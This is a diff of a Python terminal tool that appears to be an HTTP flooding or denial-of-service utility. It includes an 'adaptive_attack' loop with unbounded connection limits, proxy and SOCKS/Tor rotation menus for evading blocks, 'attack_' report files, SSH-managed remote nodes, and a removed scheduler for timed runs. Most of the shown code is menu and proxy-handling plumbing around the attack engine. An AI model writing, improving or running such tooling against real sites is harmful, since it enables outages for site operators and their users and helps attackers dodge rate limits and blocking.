             all_lines = (header_lines + attack_lines +
-                         event_lines + node_lines +
+                         node_lines + event_lines +
                          proxy_lines + activity_lines +
                          footer_lines)
 
             if len(all_lines) > max_total_lines:
                 all_lines = all_lines[:max_total_lines]
 
+            buf = ["\033[H"]
             num_lines = len(all_lines)
-            prev_lines = self._last_line_count
-
-            buf = ["\033[?2026h"]
-            buf.append("\033[H")
             for i, line in enumerate(all_lines):
                 buf.append(line)
                 buf.append("\033[K")
                 if i < num_lines - 1:
                     buf.append("\n")
-            if prev_lines >= num_lines:
-                buf.append("\033[J")
-            buf.append("\033[?2026l")
+            buf.append("\033[J")
 
             sys.stdout.write("".join(buf))
             sys.stdout.flush()
-
-            self._last_line_count = num_lines
 
         except Exception:
             pass
@@ -1642,7 +1345,7 @@ def log_event(status_type: str, message: str):
 
 
 def save_json_report(filename_prefix: str, data: dict):
-    timestamp = now_dt().strftime("%Y%m%d_%H%M%S")
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
     filename = f"attack_{filename_prefix}_{timestamp}.json"
     try:
         with open(filename, "w", encoding="utf-8") as f:
@@ -1671,9 +1374,7 @@ class ProxyManager:
         self._all_dead_notified = False
 
     def normalize_proxy(self, raw):
-        if raw is None:
-            return None
-        raw = raw.replace("\ufeff", "").replace("\r", "").strip()
+        raw = raw.strip()
         if not raw or raw.startswith("#"):
             return None
         if "#" in raw:
@@ -1684,10 +1385,7 @@ class ProxyManager:
             return raw
         try:
             host_part = raw.split("@")[-1]
-            if ":" not in host_part:
-                return f"http://{raw}"
-            port_str = host_part.rsplit(":", 1)[1]
-            port = int(port_str)
+            port = int(host_part.rsplit(":", 1)[1])
             if port in (1080, 1081, 1082, 1083, 1084, 1085,
                         9050, 9051, 9150, 9151, 1088):
                 return f"socks5://{raw}"
@@ -1701,60 +1399,16 @@ class ProxyManager:
         return f"http://{raw}"
 
     def load_from_file(self, filepath):
-        filepath = (filepath or "").strip().strip('"').strip("'")
-        if filepath.startswith("~"):
-            filepath = os.path.expanduser(filepath)
-
         if not os.path.exists(filepath):
-            alt = os.path.join(os.path.dirname(os.path.abspath(__file__)), filepath)
-            if os.path.exists(alt):
-                filepath = alt
-            else:
-                return 0, f"File not found: {filepath}"
-
-        if not os.path.isfile(filepath):
-            return 0, f"Not a file: {filepath}"
-
+            return 0, "File not found"
         count = 0
-        skipped = 0
-        invalid = 0
-        total_lines = 0
-
-        try:
-            with open(filepath, "r", encoding="utf-8-sig", errors="ignore") as f:
-                for line in f:
-                    total_lines += 1
-                    p = self.normalize_proxy(line)
-                    if not p:
-                        invalid += 1
-                        continue
-                    if p in self.all_proxies:
-                        skipped += 1
-                    else:
-                        self.all_proxies.append(p)
-                        count += 1
-        except Exception as e:
-            return 0, f"Read error: {type(e).__name__}: {e}"
-
-        total = len(self.all_proxies)
-
-        if total_lines == 0:
-            return 0, f"File is empty: {filepath}"
-
-        if count == 0 and skipped > 0:
-            return 0, (f"All {skipped} proxies already in pool "
-                       f"(total: {total})")
-
-        if count == 0:
-            return 0, (f"No valid proxies parsed from {filepath} "
-                       f"(lines: {total_lines}, invalid: {invalid})")
-
-        msg = f"Loaded {count} new proxies (total: {total})"
-        if skipped:
-            msg += f" · {skipped} duplicates skipped"
-        if invalid:
-            msg += f" · {invalid} invalid lines"
-        return count, msg
+        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
+            for line in f:
+                p = self.normalize_proxy(line)
+                if p and p not in self.all_proxies:
+                    self.all_proxies.append(p)
+                    count += 1
+        return count, f"Loaded {count} new proxies (total: {len(self.all_proxies)})"
 
     def add_proxy(self, raw):
         p = self.normalize_proxy(raw)
@@ -2125,8 +1779,6 @@ class NodeInfo:
         self.live_timeouts = 0
         self.live_srv_err = 0
         self.live_running = False
-        self._last_req_seen = 0
-        self._last_req_ts = 0
 
     def label(self):
         return f"{self.ip}:{self.port}"
@@ -2221,7 +1873,6 @@ class NodeManager:
                 return True
             except paramiko.ssh_exception.SSHException as e:
                 last_err = e
-                err_name = type(e).__name__
                 err_msg = str(e)[:70]
                 if "banner" in err_msg.lower() or "session" in err_msg.lower():
                     await asyncio.sleep(1.5)
@@ -2485,7 +2136,6 @@ class NodeManager:
 
 
 NODE_MANAGER = NodeManager()
-SCHEDULE = ScheduleManager()
 
 
 def raise_fd_limit():
@@ -2546,14 +2196,10 @@ async def safe_mode_monitor(target_url, probe_session):
 
 ADJUST_INTERVAL = 20
 
-
 async def adaptive_attack(worker_func, target_url, initial_concurrency,
                           max_concurrency, min_concurrency, duration,
                           stats, use_proxy=False, safe_mode=False,
                           rps=DEFAULT_RPS):
-    if initial_concurrency > max_concurrency:
-        max_concurrency = initial_concurrency * 2
-
     connector = aiohttp.TCPConnector(
         limit=0,
         limit_per_host=0,
@@ -2847,9 +2493,8 @@ async def run_benchmark(target_url, concurrency, duration, use_proxy,
                         safe_mode=False, rps=DEFAULT_RPS, _return_stats=False):
     stats = {"requests": 0, "success": 0, "rate_limit": 0, "blocked": 0,
              "server_error": 0, "timeouts": 0, "dropped": 0, "other": 0}
-    dyn_max = max(concurrency * 2, 3000)
     stats = await adaptive_attack(stress_worker, target_url, concurrency,
-                                  max_concurrency=dyn_max, min_concurrency=50,
+                                  max_concurrency=1000, min_concurrency=50,
                                   duration=duration, stats=stats,
                                   use_proxy=use_proxy, safe_mode=safe_mode,
                                   rps=rps)
@@ -2882,15 +2527,14 @@ async def run_benchmark(target_url, concurrency, duration, use_proxy,
 
 async def proxy_management_menu():
     while True:
-        try:
-            clear_screen()
-            total = len(PROXY_MANAGER.all_proxies)
-            working = len(PROXY_MANAGER.working_proxies)
-            dead = len(PROXY_MANAGER.dead_proxies)
-            sessions = len(PROXY_MANAGER.sessions)
-            mode = PROXY_MANAGER.rotation_mode
+        clear_screen()
+        total = len(PROXY_MANAGER.all_proxies)
+        working = len(PROXY_MANAGER.working_proxies)
+        dead = len(PROXY_MANAGER.dead_proxies)
+        sessions = len(PROXY_MANAGER.sessions)
+        mode = PROXY_MANAGER.rotation_mode
 
-            print(f"""{Colors.BOLD}{Colors.MAGENTA}
+        print(f"""{Colors.BOLD}{Colors.MAGENTA}
   ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗   ██╗
   ██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝╚██╗ ██╔╝
   ██████╔╝██████╔╝██║   ██║ ╚███╔╝  ╚████╔╝ 
@@ -2900,521 +2544,137 @@ async def proxy_management_menu():
 {Colors.RESET}{Colors.BOLD}{Colors.DIM}         ── Management & Rotation Control ──{Colors.RESET}
 """)
 
-            print(f"  {Colors.BOLD}● STATUS{Colors.RESET}")
-            print(f"  {Colors.DIM}├─{Colors.RESET} Total Loaded     {Colors.BOLD}{Colors.CYAN}{total:>5}{Colors.RESET}")
-            print(f"  {Colors.DIM}├─{Colors.RESET} Working          {Colors.BOLD}{Colors.GREEN}{working:>5}{Colors.RESET}  {Colors.DIM}(alive){Colors.RESET}")
-            print(f"  {Colors.DIM}├─{Colors.RESET} Dead             {Colors.BOLD}{Colors.RED}{dead:>5}{Colors.RESET}  {Colors.DIM}(failed){Colors.RESET}")
-            print(f"  {Colors.DIM}├─{Colors.RESET} Active Sessions  {Colors.BOLD}{Colors.MAGENTA}{sessions:>5}{Colors.RESET}")
-            print(f"  {Colors.DIM}└─{Colors.RESET} Rotation Mode    {Colors.BOLD}{Colors.YELLOW}{mode}{Colors.RESET}")
+        print(f"  {Colors.BOLD}● STATUS{Colors.RESET}")
+        print(f"  {Colors.DIM}├─{Colors.RESET} Total Loaded     {Colors.BOLD}{Colors.CYAN}{total:>5}{Colors.RESET}")
+        print(f"  {Colors.DIM}├─{Colors.RESET} Working          {Colors.BOLD}{Colors.GREEN}{working:>5}{Colors.RESET}  {Colors.DIM}(alive){Colors.RESET}")
+        print(f"  {Colors.DIM}├─{Colors.RESET} Dead             {Colors.BOLD}{Colors.RED}{dead:>5}{Colors.RESET}  {Colors.DIM}(failed){Colors.RESET}")
+        print(f"  {Colors.DIM}├─{Colors.RESET} Active Sessions  {Colors.BOLD}{Colors.MAGENTA}{sessions:>5}{Colors.RESET}")
+        print(f"  {Colors.DIM}└─{Colors.RESET} Rotation Mode    {Colors.BOLD}{Colors.YELLOW}{mode}{Colors.RESET}")
+        print()
+
+        print(f"  {Colors.BOLD}● OPERATIONS{Colors.RESET}")
+        print(f"  {Colors.CYAN}  [1]{Colors.RESET}  Load proxies from file          {Colors.DIM}→ bulk import{Colors.RESET}")
+        print(f"  {Colors.CYAN}  [2]{Colors.RESET}  Add proxy manually              {Colors.DIM}→ single add{Colors.RESET}")
+        print(f"  {Colors.GREEN}  [3]{Colors.RESET}  Validate all proxies            {Colors.DIM}→ health + ping{Colors.RESET}")
+        print(f"  {Colors.MAGENTA}  [4]{Colors.RESET}  Show proxy statistics           {Colors.DIM}→ per-proxy metrics{Colors.RESET}")
+        print(f"  {Colors.YELLOW}  [5]{Colors.RESET}  Set rotation mode               {Colors.DIM}→ random / rr / weighted{Colors.RESET}")
+        print()
+        print(f"  {Colors.BOLD}● CONFIGURATION{Colors.RESET}")
+        print(f"  {Colors.BLUE}  [6]{Colors.RESET}  Validation URL                  {Colors.DIM}→ {PROXY_MANAGER.validation_url[:40]}{Colors.RESET}")
+        print(f"  {Colors.BLUE}  [7]{Colors.RESET}  Validation timeout              {Colors.DIM}→ {PROXY_MANAGER.validation_timeout}s{Colors.RESET}")
+        print(f"  {Colors.BLUE}  [8]{Colors.RESET}  Validation concurrency          {Colors.DIM}→ {PROXY_MANAGER.validation_concurrency}{Colors.RESET}")
+        print()
+        print(f"  {Colors.BOLD}● MAINTENANCE{Colors.RESET}")
+        print(f"  {Colors.GREEN}  [9]{Colors.RESET}  Save working proxies to file    {Colors.DIM}→ working_proxies.txt{Colors.RESET}")
+        print(f"  {Colors.RED}  [C]{Colors.RESET}  Clear all proxies               {Colors.DIM}→ wipe pool{Colors.RESET}")
+        print(f"  {Colors.DIM}  [0]{Colors.RESET}  Back to main menu")
+        print()
+
+        if not SOCKS_AVAILABLE:
+            print(f"  {Colors.RED}⚠  aiohttp-socks not installed — SOCKS proxies won't work{Colors.RESET}")
+            print(f"  {Colors.DIM}   Install: pip install aiohttp-socks --break-system-packages{Colors.RESET}")
             print()
 
-            print(f"  {Colors.BOLD}● OPERATIONS{Colors.RESET}")
-            print(f"  {Colors.CYAN}  [1]{Colors.RESET}  Load proxies from file          {Colors.DIM}→ bulk import{Colors.RESET}")
-            print(f"  {Colors.CYAN}  [2]{Colors.RESET}  Add proxy manually              {Colors.DIM}→ single add{Colors.RESET}")
-            print(f"  {Colors.GREEN}  [3]{Colors.RESET}  Validate all proxies            {Colors.DIM}→ health + ping{Colors.RESET}")
-            print(f"  {Colors.MAGENTA}  [4]{Colors.RESET}  Show proxy statistics           {Colors.DIM}→ per-proxy metrics{Colors.RESET}")
-            print(f"  {Colors.YELLOW}  [5]{Colors.RESET}  Set rotation mode               {Colors.DIM}→ random / rr / weighted{Colors.RESET}")
-            print()
-            print(f"  {Colors.BOLD}● CONFIGURATION{Colors.RESET}")
-            print(f"  {Colors.BLUE}  [6]{Colors.RESET}  Validation URL                  {Colors.DIM}→ {PROXY_MANAGER.validation_url[:40]}{Colors.RESET}")
-            print(f"  {Colors.BLUE}  [7]{Colors.RESET}  Validation timeout              {Colors.DIM}→ {PROXY_MANAGER.validation_timeout}s{Colors.RESET}")
-            print(f"  {Colors.BLUE}  [8]{Colors.RESET}  Validation concurrency          {Colors.DIM}→ {PROXY_MANAGER.validation_concurrency}{Colors.RESET}")
-            print()
-            print(f"  {Colors.BOLD}● MAINTENANCE{Colors.RESET}")
-            print(f"  {Colors.GREEN}  [9]{Colors.RESET}  Save working proxies to file    {Colors.DIM}→ working_proxies.txt{Colors.RESET}")
-            print(f"  {Colors.RED}  [C]{Colors.RESET}  Clear all proxies               {Colors.DIM}→ wipe pool{Colors.RESET}")
-            print(f"  {Colors.DIM}  [0]{Colors.RESET}  Back to main menu")
-            print()
+        print(f"  {Colors.DIM}{'─' * 60}{Colors.RESET}")
 
-            if not SOCKS_AVAILABLE:
-                print(f"  {Colors.RED}⚠  aiohttp-socks not installed — SOCKS proxies won't work{Colors.RESET}")
-                print(f"  {Colors.DIM}   Install: pip install aiohttp-socks --break-system-packages{Colors.RESET}")
-                print()
+        choice = input(f"\n  {Colors.BOLD}➜ Select option: {Colors.RESET}").strip().lower()
 
-            print(f"  {Colors.DIM}{'─' * 60}{Colors.RESET}")
-
-            choice = safe_input(f"\n  {Colors.BOLD}➜ Select option: {Colors.RESET}").strip().lower()
-
-            if choice == "0":
-                return
-            elif choice == "1":
-                filepath = safe_input(f"  {Colors.BOLD}Proxy file path [{Colors.GREEN}proxies.txt{Colors.RESET}]: ").strip() or "proxies.txt"
-                count, msg = PROXY_MANAGER.load_from_file(filepath)
-                print(f"\n  {Colors.GREEN}✓{Colors.RESET} {msg}")
-                safe_input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-            elif choice == "2":
-                raw = safe_input(f"  {Colors.BOLD}Proxy (e.g. socks5://user:pass@ip:port): {Colors.RESET}").strip()
-                ok, msg = PROXY_MANAGER.add_proxy(raw)
-                color = Colors.GREEN if ok else Colors.RED
-                symbol = "✓" if ok else "!"
-                print(f"\n  {color}{symbol}{Colors.RESET} {msg}")
-                safe_input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-            elif choice == "3":
-                if not PROXY_MANAGER.all_proxies:
-                    print(f"\n  {Colors.RED}⚠ No proxies loaded.{Colors.RESET}")
-                    safe_input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-                    continue
-                alive, dead, _ = await PROXY_MANAGER.validate_all()
-                if alive > 0:
-                    print(f"  {Colors.CYAN}➜ Creating sessions for working proxies...{Colors.RESET}")
-                    created = await PROXY_MANAGER.create_sessions()
-                    PROXY_MANAGER.enabled = True
-                    print(f"  {Colors.GREEN}✓ {created} sessions ready. Proxy rotation ENABLED.{Colors.RESET}")
-                safe_input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-            elif choice == "4":
-                PROXY_MANAGER.print_stats()
-                safe_input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-            elif choice == "5":
-                print(f"\n  {Colors.BOLD}Available rotation modes:{Colors.RESET}\n")
-                print(f"  {Colors.CYAN}  [1]{Colors.RESET}  random          {Colors.DIM}— random proxy per request{Colors.RESET}")
-                print(f"  {Colors.CYAN}  [2]{Colors.RESET}  round_robin     {Colors.DIM}— sequential rotation{Colors.RESET}")
-                print(f"  {Colors.CYAN}  [3]{Colors.RESET}  weighted        {Colors.DIM}— favor faster proxies{Colors.RESET}")
-                print()
-                mode_input = safe_input(f"  {Colors.BOLD}➜ Select mode [{Colors.YELLOW}current: {PROXY_MANAGER.rotation_mode}{Colors.RESET}]: {Colors.RESET}").strip()
-
-                mode_map = {"1": "random", "2": "round_robin", "3": "weighted"}
-
-                if not mode_input:
-                    mode = PROXY_MANAGER.rotation_mode
-                elif mode_input in mode_map:
-                    mode = mode_map[mode_input]
-                elif mode_input in ("random", "round_robin", "weighted"):
-                    mode = mode_input
-                else:
-                    mode = None
-
-                if mode:
-                    PROXY_MANAGER.rotation_mode = mode
-                    print(f"\n  {Colors.GREEN}✓{Colors.RESET} Rotation mode set to: {Colors.BOLD}{mode}{Colors.RESET}")
-                else:
-                    print(f"\n  {Colors.RED}⚠ Invalid mode{Colors.RESET}")
-                safe_input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-            elif choice == "6":
-                url = safe_input(f"  {Colors.BOLD}Validation URL [{Colors.DIM}{PROXY_MANAGER.validation_url}{Colors.RESET}]: ").strip()
-                if url:
-                    PROXY_MANAGER.validation_url = url
-                    print(f"\n  {Colors.GREEN}✓{Colors.RESET} URL updated")
-                safe_input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-            elif choice == "7":
-                t = safe_input(f"  {Colors.BOLD}Timeout seconds [{Colors.DIM}{PROXY_MANAGER.validation_timeout}{Colors.RESET}]: ").strip()
-                if t.isdigit():
-                    PROXY_MANAGER.validation_timeout = int(t)
-                    print(f"\n  {Colors.GREEN}✓{Colors.RESET} Timeout set to {Colors.BOLD}{t}s{Colors.RESET}")
-                safe_input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-            elif choice == "8":
-                c = safe_input(f"  {Colors.BOLD}Concurrency [{Colors.DIM}{PROXY_MANAGER.validation_concurrency}{Colors.RESET}]: ").strip()
-                if c.isdigit():
-                    PROXY_MANAGER.validation_concurrency = int(c)
-                    print(f"\n  {Colors.GREEN}✓{Colors.RESET} Concurrency set to {Colors.BOLD}{c}{Colors.RESET}")
-                safe_input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-            elif choice == "9":
-                if not PROXY_MANAGER.working_proxies:
-                    print(f"\n  {Colors.RED}⚠ No working proxies to save.{Colors.RESET}")
-                else:
-                    fp = PROXY_MANAGER.save_working()
-                    print(f"\n  {Colors.GREEN}✓{Colors.RESET} Saved {Colors.BOLD}{len(PROXY_MANAGER.working_proxies)}{Colors.RESET} proxies to {fp}")
-                safe_input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-            elif choice == "c":
-                confirm = safe_input(f"\n  {Colors.RED}Clear ALL proxies? (y/N): {Colors.RESET}").strip().lower()
-                if confirm == "y":
-                    msg = PROXY_MANAGER.clear_all()
-                    print(f"\n  {Colors.GREEN}✓{Colors.RESET} {msg}")
-                safe_input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-        except MenuBack:
-            print(f"\n  {Colors.YELLOW}⚠{Colors.RESET} Back to main menu")
-            time.sleep(0.4)
+        if choice == "0":
             return
-
-
-async def schedule_management_menu():
-    def _parse_hhmm(s):
-        s = (s or "").strip()
-        parts = s.split(":")
-        if len(parts) != 2:
-            raise ValueError("HH:MM")
-        h = int(parts[0]); m = int(parts[1])
-        if not (0 <= h < 24 and 0 <= m < 60):
-            raise ValueError("range")
-        return f"{h:02d}:{m:02d}"
-
-    def _parse_days(s):
-        if not (s or "").strip():
-            return []
-        out = []
-        for x in s.split(","):
-            x = x.strip()
-            if not x:
+        elif choice == "1":
+            filepath = input(f"  {Colors.BOLD}Proxy file path [{Colors.GREEN}proxies.txt{Colors.RESET}]: ").strip() or "proxies.txt"
+            count, msg = PROXY_MANAGER.load_from_file(filepath)
+            print(f"\n  {Colors.GREEN}✓{Colors.RESET} {msg}")
+            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
+        elif choice == "2":
+            raw = input(f"  {Colors.BOLD}Proxy (e.g. socks5://user:pass@ip:port): {Colors.RESET}").strip()
+            ok, msg = PROXY_MANAGER.add_proxy(raw)
+            color = Colors.GREEN if ok else Colors.RED
+            symbol = "✓" if ok else "!"
+            print(f"\n  {color}{symbol}{Colors.RESET} {msg}")
+            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
+        elif choice == "3":
+            if not PROXY_MANAGER.all_proxies:
+                print(f"\n  {Colors.RED}⚠ No proxies loaded.{Colors.RESET}")
+                input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
                 continue
-            d = int(x)
-            if not (0 <= d <= 6):
-                raise ValueError("day range")
-            out.append(d)
-        return out
-
-    def _ask_add_more():
-        a = safe_input(f"  {Colors.BOLD}➜ Add another slot? [{Colors.GREEN}Y{Colors.RESET}/n]: ").strip().lower()
-        if a in ("", "y", "yes"):
-            return True
-        return False
-
-    def _add_absolute():
-        while True:
-            try:
-                clear_screen()
-                print_banner()
-                print(f"  {Colors.BOLD}{Colors.MAGENTA}● ADD ABSOLUTE SLOT{Colors.RESET}")
-                print(f"  {Colors.DIM}{'─' * 60}{Colors.RESET}\n")
-                print(f"  {Colors.DIM}Format: YYYY-MM-DD  (Enter = today)  ·  HH:MM (Enter = now){Colors.RESET}\n")
-                now = now_dt()
-                today_str = now.strftime("%Y-%m-%d")
-                now_hm = now.strftime("%H:%M")
-
-                sd = safe_input(f"  {Colors.BOLD}➜ Start date [{Colors.GREEN}{today_str}{Colors.RESET}]: ").strip()
-                if not sd:
-                    sd = today_str
-                datetime.strptime(sd, "%Y-%m-%d")
-
-                st_raw = safe_input(f"  {Colors.BOLD}➜ Start time [{Colors.GREEN}{now_hm}{Colors.RESET}]: ").strip()
-                if not st_raw:
-                    st_raw = now_hm
-                st = _parse_hhmm(st_raw)
-
-                ed = safe_input(f"  {Colors.BOLD}➜ End date   [{Colors.GREEN}{sd}{Colors.RESET}]: ").strip()
-                if not ed:
-                    ed = sd
-                datetime.strptime(ed, "%Y-%m-%d")
-
-                try:
-                    base = datetime.strptime(f"{sd} {st}", "%Y-%m-%d %H:%M")
-                    default_end = (base + timedelta(hours=1)).strftime("%H:%M")
-                except Exception:
-                    default_end = "23:59"
-
-                et_raw = safe_input(f"  {Colors.BOLD}➜ End time   [{Colors.GREEN}{default_end}{Colors.RESET}]: ").strip()
-                if not et_raw:
-                    et_raw = default_end
-                et = _parse_hhmm(et_raw)
-
-                start = f"{sd} {st}"
-                end = f"{ed} {et}"
-                try:
-                    s_dt = datetime.strptime(start, "%Y-%m-%d %H:%M")
-                    e_dt = datetime.strptime(end, "%Y-%m-%d %H:%M")
-                except Exception:
-                    print(f"\n  {Colors.RED}⚠ Invalid datetime.{Colors.RESET}")
-                    time.sleep(1.2)
-                    continue
-                if e_dt <= s_dt:
-                    print(f"\n  {Colors.RED}⚠ End must be after start.{Colors.RESET}")
-                    time.sleep(1.2)
-                    continue
-
-                SCHEDULE.add(AbsoluteSlot(start, end))
-                print(f"\n  {Colors.GREEN}✓{Colors.RESET} Added: {start} → {end}")
-                if not _ask_add_more():
-                    return
-            except MenuBack:
-                print(f"\n  {Colors.YELLOW}⚠{Colors.RESET} Cancelled — returning to schedule menu")
-                time.sleep(0.4)
-                return
-            except Exception:
-                print(f"\n  {Colors.RED}⚠ Invalid input. Try again.{Colors.RESET}")
-                time.sleep(1.2)
-                continue
-
-    def _add_daily():
-        while True:
-            try:
-                clear_screen()
-                print_banner()
-                print(f"  {Colors.BOLD}{Colors.MAGENTA}● ADD DAILY RECURRING SLOT{Colors.RESET}")
-                print(f"  {Colors.DIM}{'─' * 60}{Colors.RESET}\n")
-                now = now_dt()
-                now_hm = now.strftime("%H:%M")
-                try:
-                    base = datetime.strptime(now_hm, "%H:%M")
-                    default_end = (base + timedelta(hours=1)).strftime("%H:%M")
-                except Exception:
-                    default_end = "23:59"
-
-                st_raw = safe_input(f"  {Colors.BOLD}➜ Start time (HH:MM) [{Colors.GREEN}{now_hm}{Colors.RESET}]: ").strip()
-                if not st_raw:
-                    st_raw = now_hm
-                st = _parse_hhmm(st_raw)
-
-                et_raw = safe_input(f"  {Colors.BOLD}➜ End time   (HH:MM) [{Colors.GREEN}{default_end}{Colors.RESET}]: ").strip()
-                if not et_raw:
-                    et_raw = default_end
-                et = _parse_hhmm(et_raw)
-
-                print()
-                print(f"  {Colors.DIM}Day indices: 0=Mon  1=Tue  2=Wed  3=Thu  4=Fri  5=Sat  6=Sun{Colors.RESET}")
-                all_days = safe_input(f"  {Colors.BOLD}➜ Include ALL days? [{Colors.GREEN}Y{Colors.RESET}/n]: ").strip().lower()
-                days = None
-                if all_days in ("n", "no"):
-                    default_day = now.weekday()
-                    raw = safe_input(f"  {Colors.BOLD}➜ Which days to include (e.g. 0,1,2) [{Colors.GREEN}{default_day}{Colors.RESET}]: ").strip()
-                    if not raw:
-                        raw = str(default_day)
-                    days = _parse_days(raw)
-                    if not days:
-                        raise ValueError("empty")
-
-                skip_days = []
-                skip_ans = safe_input(f"  {Colors.BOLD}➜ Skip any specific days? [y/{Colors.GREEN}N{Colors.RESET}]: ").strip().lower()
-                if skip_ans in ("y", "yes"):
-                    skip_days = _parse_days(
-                        safe_input(f"  {Colors.BOLD}➜ Days to skip (e.g. 3,4): {Colors.RESET}").strip()
-                    )
-
-                slot = DailySlot(st, et, days, skip_days)
-                SCHEDULE.add(slot)
-                print(f"\n  {Colors.GREEN}✓{Colors.RESET} Added: {slot.describe()}")
-                if not _ask_add_more():
-                    return
-            except MenuBack:
-                print(f"\n  {Colors.YELLOW}⚠{Colors.RESET} Cancelled — returning to schedule menu")
-                time.sleep(0.4)
-                return
-            except Exception:
-                print(f"\n  {Colors.RED}⚠ Invalid input. Try again.{Colors.RESET}")
-                time.sleep(1.2)
-                continue
-
-    def _add_weekly():
-        while True:
-            try:
-                clear_screen()
-                print_banner()
-                print(f"  {Colors.BOLD}{Colors.MAGENTA}● ADD WEEKLY SLOT{Colors.RESET}")
-                print(f"  {Colors.DIM}{'─' * 60}{Colors.RESET}\n")
-                print(f"  {Colors.DIM}Day indices: 0=Mon  1=Tue  2=Wed  3=Thu  4=Fri  5=Sat  6=Sun{Colors.RESET}\n")
-                now = now_dt()
-                default_day = now.weekday()
-                default_day_name = WEEKDAYS_FULL[default_day]
-                print(f"  {Colors.DIM}Today is {Colors.BOLD}{default_day_name}{Colors.RESET} "
-                      f"{Colors.DIM}(index {default_day}){Colors.RESET}\n")
-
-                raw = safe_input(f"  {Colors.BOLD}➜ Weekday(s) (e.g. 0 or 0,2,4) [{Colors.GREEN}{default_day}{Colors.RESET}]: ").strip()
-                if not raw:
-                    raw = str(default_day)
-                days = _parse_days(raw)
-                if not days:
-                    raise ValueError("empty")
-
-                now_hm = now.strftime("%H:%M")
-                try:
-                    base = datetime.strptime(now_hm, "%H:%M")
-                    default_end = (base + timedelta(hours=1)).strftime("%H:%M")
-                except Exception:
-                    default_end = "23:59"
-
-                st_raw = safe_input(f"  {Colors.BOLD}➜ Start time (HH:MM) [{Colors.GREEN}{now_hm}{Colors.RESET}]: ").strip()
-                if not st_raw:
-                    st_raw = now_hm
-                st = _parse_hhmm(st_raw)
-
-                et_raw = safe_input(f"  {Colors.BOLD}➜ End time   (HH:MM) [{Colors.GREEN}{default_end}{Colors.RESET}]: ").strip()
-                if not et_raw:
-                    et_raw = default_end
-                et = _parse_hhmm(et_raw)
-
-                slot = DailySlot(st, et, days, [])
-                SCHEDULE.add(slot)
-                print(f"\n  {Colors.GREEN}✓{Colors.RESET} Added: {slot.describe()}")
-                if not _ask_add_more():
-                    return
-            except MenuBack:
-                print(f"\n  {Colors.YELLOW}⚠{Colors.RESET} Cancelled — returning to schedule menu")
-                time.sleep(0.4)
-                return
-            except Exception:
-                print(f"\n  {Colors.RED}⚠ Invalid input. Try again.{Colors.RESET}")
-                time.sleep(1.2)
-                continue
-
-    def _add_monthly():
-        while True:
-            try:
-                clear_screen()
-                print_banner()
-                print(f"  {Colors.BOLD}{Colors.MAGENTA}● ADD MONTHLY SLOT{Colors.RESET}")
-                print(f"  {Colors.DIM}{'─' * 60}{Colors.RESET}\n")
-                now = now_dt()
-                today_day = now.day
-                now_hm = now.strftime("%H:%M")
-                try:
-                    base = datetime.strptime(now_hm, "%H:%M")
-                    default_end = (base + timedelta(hours=1)).strftime("%H:%M")
-                except Exception:
-                    default_end = "23:59"
-
-                d_raw = safe_input(f"  {Colors.BOLD}➜ Day of month (1-31) [{Colors.GREEN}{today_day}{Colors.RESET}]: ").strip()
-                if not d_raw:
-                    d_raw = str(today_day)
-                d = int(d_raw)
-                if not (1 <= d <= 31):
-                    raise ValueError("range")
-
-                st_raw = safe_input(f"  {Colors.BOLD}➜ Start time (HH:MM) [{Colors.GREEN}{now_hm}{Colors.RESET}]: ").strip()
-                if not st_raw:
-                    st_raw = now_hm
-                st = _parse_hhmm(st_raw)
-
-                et_raw = safe_input(f"  {Colors.BOLD}➜ End time   (HH:MM) [{Colors.GREEN}{default_end}{Colors.RESET}]: ").strip()
-                if not et_raw:
-                    et_raw = default_end
-                et = _parse_hhmm(et_raw)
-
-                slot = MonthlySlot(d, st, et)
-                SCHEDULE.add(slot)
-                print(f"\n  {Colors.GREEN}✓{Colors.RESET} Added: {slot.describe()}")
-                if not _ask_add_more():
-                    return
-            except MenuBack:
-                print(f"\n  {Colors.YELLOW}⚠{Colors.RESET} Cancelled — returning to schedule menu")
-                time.sleep(0.4)
-                return
-            except Exception:
-                print(f"\n  {Colors.RED}⚠ Invalid input. Try again.{Colors.RESET}")
-                time.sleep(1.2)
-                continue
-
-    def _add_hourly():
-        while True:
-            try:
-                clear_screen()
-                print_banner()
-                print(f"  {Colors.BOLD}{Colors.MAGENTA}● ADD HOURLY SLOT{Colors.RESET}")
-                print(f"  {Colors.DIM}{'─' * 60}{Colors.RESET}\n")
-                print(f"  {Colors.DIM}Example: start at :00 for 15 min → runs 10:00-10:15, 11:00-11:15, ...{Colors.RESET}\n")
-
-                m_raw = safe_input(f"  {Colors.BOLD}➜ Start at minute (0-59) [{Colors.GREEN}0{Colors.RESET}]: ").strip()
-                if not m_raw:
-                    m_raw = "0"
-                m = int(m_raw)
-                if not (0 <= m <= 59):
-                    raise ValueError("range")
-
-                dm_raw = safe_input(f"  {Colors.BOLD}➜ Duration (minutes, 1-59) [{Colors.GREEN}15{Colors.RESET}]: ").strip()
-                if not dm_raw:
-                    dm_raw = "15"
-                dm = int(dm_raw)
-                if not (1 <= dm <= 59):
-                    raise ValueError("range")
-
-                slot = HourlySlot(m, dm)
-                SCHEDULE.add(slot)
-                print(f"\n  {Colors.GREEN}✓{Colors.RESET} Added: {slot.describe()}")
-                if not _ask_add_more():
-                    return
-            except MenuBack:
-                print(f"\n  {Colors.YELLOW}⚠{Colors.RESET} Cancelled — returning to schedule menu")
-                time.sleep(0.4)
-                return
-            except Exception:
-                print(f"\n  {Colors.RED}⚠ Invalid input. Try again.{Colors.RESET}")
-                time.sleep(1.2)
-                continue
-
-    while True:
-        try:
-            clear_screen()
-            print_banner()
